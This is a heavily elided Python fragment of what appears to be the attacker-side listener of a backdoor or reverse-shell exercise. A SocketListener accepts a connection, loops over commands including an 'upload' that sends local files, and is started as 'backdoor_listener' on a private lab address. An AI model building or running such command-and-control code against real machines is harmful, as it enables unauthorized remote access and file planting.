...
class SocketListener:
    def __init__(self,ip,port):
        ...
        print("Connection OK from " + my_address)
        ...
        while True:
            ...
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_contents(command_input[1])
...
backdoor_listener = SocketListener("10.0.2.15",8080)
backdoor_listener.start_listener()